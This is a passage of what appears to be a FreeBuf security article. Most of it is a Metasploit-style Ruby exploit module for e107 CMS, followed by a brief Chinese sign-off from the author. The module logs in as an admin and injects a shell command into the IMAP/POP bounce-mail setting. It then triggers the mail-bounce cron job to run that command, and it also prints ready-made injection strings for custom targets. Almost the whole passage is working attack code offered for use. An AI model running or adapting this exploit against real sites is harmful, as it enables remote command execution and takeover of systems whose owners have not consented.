+          # e107 has an encoder which prevents $IFS$() from being used as $ = &#036;
+          # \t also became /t, however "\t" does seem to work.
+     
+          # e107 also uses a cron job to check bounce jobs, which may not be active.
+          # either cron can be disabled, or bounce checks disabled, so we try to
+          # kick the process manually, however if it doesn't work we'll hope
+          # cron is running and we get a call back anyways.
+     
+          vprint_status("Logging in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+          res = send_request_cgi(
+            'method' => 'POST',
+            'uri' => normalize_uri(target_uri.path, 'e107_admin', 'admin.php'),
+            'vars_post' => {
+              'authname' => datastore['USERNAME'],
+              'authpass' => datastore['PASSWORD'],
+              'authsubmit' => 'Log In'
+          })
+          unless res
+            print_error('Error loading site.  Check options.')
+            return
+          end
+     
+          if res.code == 302
+            cookie = res.get_cookies
+            print_good('Login Success')
+          else
+            print_error('Failed Login, check options.')
+          end
+     
+     
+          vprint_status('Checking if Cron is enabled for triggering')
+          res = send_request_cgi(
+            'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),
+            'cookie' => cookie
+          )
+          unless res
+            print_error('Error loading site.  Check options.')
+            return
+          end
+          if res.body.include? 'Status: <b>Disabled</b>'
+            print_error('Cron disabled, unexploitable.')
+            return
+          end
+     
+          print_good('Storing payload in mail settings')
+     
+          # the imap/pop field is hard to find. Check Users > Mail
+          # then check "Bounced emails - Processing method" and set it to "Mail account"
+          send_request_cgi(
+            'method' => 'POST',
+            'uri' => normalize_uri(target_uri.path, 'e107_admin', 'mailout.php'),
+            'cookie' => cookie,
+            'vars_get' => {
+              'mode' => 'prefs',
+              'action' => 'prefs'
+            },
+            'vars_post' => {
+              'testaddress' => 'none@none.com',
+              'testtemplate' => 'textonly',
+              'bulkmailer' => 'smtp',
+              'smtp_server' => '1.1.1.1',
+              'smtp_username' => 'username',
+              'smtp_password' => 'password',
+              'smtp_port' => '25',
+              'smtp_options' => '',
+              'smtp_keepalive' => '0',
+              'smtp_useVERP' => '0',
+              'mail_sendstyle' => 'texthtml',
+              'mail_pause' => '3',
+              'mail_pausetime' => '4',
+              'mail_workpertick' => '5',
+              'mail_log_option' => '0',
+              'mail_bounce' => 'mail',
+              'mail_bounce_email2' => '',
+              'mail_bounce_email' => "#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org",
+              'mail_bounce_pop3' => "x #{command("\t")}}",
+              'mail_bounce_user' => Rex::Text.rand_text_alphanumeric(8),
+              'mail_bounce_pass' => Rex::Text.rand_text_alphanumeric(8),
+              'mail_bounce_type' => 'imap',
+              'mail_bounce_auto' => '1',
+              'updateprefs' => 'Save Changes'
+          })
+     
+     
+          vprint_status('Loading cron page to execute job manually')
+          res =  send_request_cgi(
+            'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),
+            'cookie' => cookie
+          )
+     
+          unless res
+            print_error('Error loading site.  Check options.')
+            return
+          end
+     
+          if /name='e-token' value='(?<etoken>\w{32})'/ =~ res.body && /_system::procEmailBounce.+?cron_execute\[(?<cron_id>\d)\]/m =~ res.body
+            print_good("Triggering manual run of mail bounch check cron to execute payload with cron id #{cron_id} and etoken #{etoken}")
+            # The post request has several duplicate columns, however all were not required.  Left them commented for documentation purposes
+            send_request_cgi(
+              'method' => 'POST',
+              'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),
+              'cookie' => cookie,
+              'vars_post' => {
+                'e-token' => etoken,
+                #'e-columns[]' => 'cron_category',
+                'e-columns[]' => 'cron_name',
+                #'e-columns[]' => 'cron_description',
+                #'e-columns[]' => 'cron_function',
+                #'e-columns[]' => 'cron_tab',
+                #'e-columns[]' => 'cron_lastrun',
+                #'e-columns[]' => 'cron_active',
+                "cron_execute[#{cron_id}]" => '1',
+                'etrigger_batch' => ''
+            })
+     
+          else
+            print_error('e-token not found, required for manual exploitation.  Wait 60sec, cron may still trigger.')
+          end
+     
+          print_status('IMAP server config left on server, manual removal required.')
+        elsif target.name =~ /custom/
+          print_status('Listener started for 300 seconds')
+          print_good("POST request connection string: x #{command}}")
+          # URI.encode leaves + as + since that's a space encoded.  So we manually change it.
+          print_good("GET request connection string: #{URI.encode("x " + command + "}").sub! '+', '%2B'}")
+        end
+      end
+    end
+    
+
+有时间在搞，如何利用，相关图片我整理一下在上传，现在截稿已经4.34分......看着一堆大佬的英文帖子，搞出来的。
+
+ ***本文原创作者：不分手的恋爱，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
